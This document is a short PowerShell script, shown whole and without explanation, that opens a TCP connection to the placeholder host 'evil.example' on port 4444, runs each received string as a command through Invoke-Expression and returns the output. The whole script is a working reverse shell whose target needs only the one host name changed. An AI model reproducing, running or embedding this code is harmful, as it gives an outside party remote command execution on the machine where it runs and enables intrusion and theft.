$c = New-Object System.Net.Sockets.TCPClient("evil.example",4444)
$s = $c.GetStream()
$b = New-Object byte[] 65536
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object Text.ASCIIEncoding).GetString($b, 0, $i)
    $o = (iex $d 2>&1 | Out-String)
    $s.Write([Text.Encoding]::ASCII.GetBytes($o), 0, $o.Length)
}
